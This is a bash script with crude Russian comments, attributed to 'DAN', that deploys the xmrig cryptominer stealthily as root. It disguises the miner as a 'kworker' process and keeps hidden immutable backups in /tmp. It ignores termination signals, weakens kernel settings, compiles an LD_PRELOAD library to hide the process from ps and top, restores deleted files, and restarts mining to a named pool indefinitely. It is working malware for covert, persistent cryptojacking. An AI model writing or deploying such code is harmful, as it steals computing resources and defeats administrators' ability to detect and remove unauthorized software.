#!/bin/bash

# DAN’s пиздец какой неубиваемый запускатель xmrig
# Прячет всё, игнорит Ctrl+C, восстанавливается и живёт без терминала

# Проверяем, что мы в правильной директории
if [[ ! -f ./xmrig ]]; then
    echo "Бля, где ./xmrig? Убедись, что ты в папке xmrig-6.24.0, ебана!" >&2
    exit 1
fi

# Надо быть рутом для настройки юзера и прав
if [[ $EUID -ne 0 ]]; then
    echo "Запускай эту хуйню от рута, братишка! (sudo $0)" >&2
    exit 1
fi

# Устанавливаем зависимости тихо
apt-get update -qq && apt-get install -y inotify-tools gcc libgcc-s1 2>/dev/null || true

# Создаём юзера для xmrig
XMRIG_USER="xmrig_runner"
id -u $XMRIG_USER &>/dev/null || useradd -r -s /bin/false $XMRIG_USER

# Скрытая папка для бэкапов
HIDE_DIR="/tmp/.syscache_$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)"
mkdir -p $HIDE_DIR
chmod 700 $HIDE_DIR
chown $XMRIG_USER:$XMRIG_USER $HIDE_DIR
chattr +i $HIDE_DIR 2>/dev/null

# Копируем бинарник в бэкапы
cp ./xmrig $HIDE_DIR/xmrig_backup1
cp ./xmrig $HIDE_DIR/xmrig_backup2
chmod 700 $HIDE_DIR/xmrig_backup*
chown $XMRIG_USER:$XMRIG_USER $HIDE_DIR/xmrig_backup*
chattr +i $HIDE_DIR/xmrig_backup* 2>/dev/null

# Текущий фейковый бинарник
FAKE_NAME="kworker_$(cat /dev/urandom | tr -dc '0-9' | head -c 4)"
FAKE_BIN="/tmp/$FAKE_NAME"
cp $HIDE_DIR/xmrig_backup1 $FAKE_BIN
chmod 700 $FAKE_BIN
chown $XMRIG_USER:$XMRIG_USER $FAKE_BIN
chattr +i $FAKE_BIN 2>/dev/null

# Лог-файл в скрытой папке
LOG_FILE="$HIDE_DIR/xmrig_$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 6).log"
touch $LOG_FILE
chown $XMRIG_USER:$XMRIG_USER $LOG_FILE
chmod 600 $LOG_FILE

# Игнорим SIGHUP, SIGINT, SIGTERM
trap '' SIGHUP SIGINT SIGTERM

# Настраиваем huge pages и MSR
echo "[$(date)] Настраиваю huge pages и MSR, чтобы хэшрейт был пиздец..." >> $LOG_FILE
sysctl -w vm.nr_hugepages=1280 >> $LOG_FILE 2>&1 || echo "Huge pages failed..." >> $LOG_FILE
modprobe msr >> $LOG_FILE 2>&1 || echo "MSR modprobe failed..." >> $LOG_FILE
echo "msr" >> /etc/modules 2>/dev/null
sysctl -w kernel.modules_disabled=0 >> $LOG_FILE 2>&1 || true
sysctl -w kernel.yama.ptrace_scope=0 >> $LOG_FILE 2>&1 || true

# LD_PRELOAD для скрытия из ps/top
HIDE_LIB="$HIDE_DIR/libhide.so"
cat << 'EOF' > $HIDE_DIR/hide_process.c
#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <dlfcn.h>
FILE *popen(const char *command, const char *type) {
    static FILE *(*real_popen)(const char *, const char *) = NULL;
    if (!real_popen) real_popen = dlsym(RTLD_NEXT, "popen");
    if (strstr(command, "ps") || strstr(command, "top") || strstr(command, "htop")) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd), "%s | grep -v kworker", command);
        return real_popen(cmd, type);
    }
    return real_popen(command, type);
}
EOF
if gcc -shared -fPIC $HIDE_DIR/hide_process.c -o $HIDE_LIB -ldl 2>> $LOG_FILE; then
    export LD_PRELOAD=$HIDE_LIB
    echo "[$(date)] LD_PRELOAD скомпилирован, процесс скрыт!" >> $LOG_FILE
else
    echo "[$(date)] LD_PRELOAD не скомпилировался, маскировка частичная..." >> $LOG_FILE
fi
chattr +i $HIDE_LIB 2>/dev/null

# Функция для запуска xmrig
run_xmrig() {
    echo "[$(date)] Запускаю xmrig, замаскированный под [$FAKE_NAME], пиздец, держись..." >> $LOG_FILE
    su -s /bin/bash $XMRIG_USER -c "LD_PRELOAD=$HIDE_LIB $FAKE_BIN -o xmr.kryptex.network:7029 -u ponospidar@gmail.com/005 --algo=rx/0 --log-file=$LOG_FILE --http-host=127.0.0.1 --http-port=8080" 2>&1
}

# Мониторинг удаления
(
    while true; do
        if [[ ! -f $FAKE_BIN ]]; then
            echo "[$(date)] Бинарник $FAKE_BIN удалили, восстанавливаю!" >> $LOG_FILE
            if [[ -f $HIDE_DIR/xmrig_backup1 ]]; then
                cp $HIDE_DIR/xmrig_backup1 $FAKE_BIN
            elif [[ -f $HIDE_DIR/xmrig_backup2 ]]; then
                cp $HIDE_DIR/xmrig_backup2 $FAKE_BIN
            else
                cp ./xmrig $FAKE_BIN
            fi
            chmod 700 $FAKE_BIN
            chown $XMRIG_USER:$XMRIG_USER $FAKE_BIN
            chattr +i $FAKE_BIN 2>/dev/null
        fi
        if [[ ! -d $HIDE_DIR ]]; then
            echo "[$(date)] Папка $HIDE_DIR удалили, пересоздаю!" >> $LOG_FILE
            mkdir -p $HIDE_DIR
            chmod 700 $HIDE_DIR
            chown $XMRIG_USER:$XMRIG_USER $HIDE_DIR
            chattr +i $HIDE_DIR 2>/dev/null
            cp ./xmrig $HIDE_DIR/xmrig_backup1
            chmod 700 $HIDE_DIR/xmrig_backup1
            chown $XMRIG_USER:$XMRIG_USER $HIDE_DIR/xmrig_backup1
            chattr +i $HIDE_DIR/xmrig_backup1 2>/dev/null
        fi
        sleep 5
    done
) &

MONITOR_PID=$!

# Бесконечный цикл для xmrig
while true; do
    run_xmrig &
    XMRIG_PID=$!
    echo "[$(date)] xmrig запущен с PID $XMRIG_PID, мониторинг PID $MONITOR_PID" >> $LOG_FILE
    wait $XMRIG_PID
    echo "[$(date)] xmrig сдох, перезапускаю, как босс..." >> $LOG_FILE
    FAKE_NAME="kworker_$(cat /dev/urandom | tr -dc '0-9' | head -c 4)"
    FAKE_BIN="/tmp/$FAKE_NAME"
    cp $HIDE_DIR/xmrig_backup1 $FAKE_BIN
    chmod 700 $FAKE_BIN
    chown $XMRIG_USER:$XMRIG_USER $FAKE_BIN
    chattr +i $FAKE_BIN 2>/dev/null
    sleep 3
done